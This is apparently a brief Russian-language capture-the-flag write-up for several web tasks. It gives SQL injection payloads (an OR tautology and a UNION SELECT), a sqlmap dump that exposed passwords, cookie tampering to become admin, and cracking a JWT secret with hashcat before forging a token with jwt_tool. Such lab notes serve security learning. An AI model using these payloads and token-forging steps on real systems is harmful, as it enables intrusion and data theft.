Task2 "Чтобы получить флаг, отправьте запрос с get-параметром name: PolyCTF и post-параметром flag: yep" ![Pasted image 20250205115558](https://github.com/user-attachments/assets/ac364fa1-11f7-434d-aefc-0ecdc09e170c)


Task 3. Выставляем Cookie: username=admin и получаем флаг

task 4. брут code

task 5. sqlmap (hard and all) Выдал данные из базы, в том числе пароли и флаг
![Pasted image 20250205170814](https://github.com/user-attachments/assets/47e11fed-25d7-44f4-ae21-b40b89bbc534)

-8409 OR 4979=4979 - генерирует запросы для всех купонов
-1 UNION SELECT fl4g FROM s3cret - позволяет вытащить флаг (если знать название таблицы с колонок)

task 6. Изменение значения в репиторе 

task 7 . Получаем jwt токен из запроса eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.KVcwu6cwfsOQXQooeH7-S0j__1NwteG-9jFZ63aApe0 
![Pasted image 20250205201706](https://github.com/user-attachments/assets/25b8d06f-5cf0-4014-8fd2-aece716fe134)

Через hashcat (hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt ) получаем закрытый ключ IC3QU33NS

С помощью jwt_tool (https://github.com/ticarpi/jwt_tool) изменяем данные в токене ```
python3 jwt_tool.py -T -p IC3QU33NS  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.KVcwu6cwfsOQXQooeH7-S0j__1NwteG-9jFZ63aApe0 -S hs256```
![Pasted image 20250205202008](https://github.com/user-attachments/assets/3915b7ce-6ccc-4dfe-b780-0ec47cae7c25)


Полученный токен отправляем через repeator и получаем флаг
![Pasted image 20250205202037](https://github.com/user-attachments/assets/b3706625-b323-4b2e-8600-c3730bf6fdea)


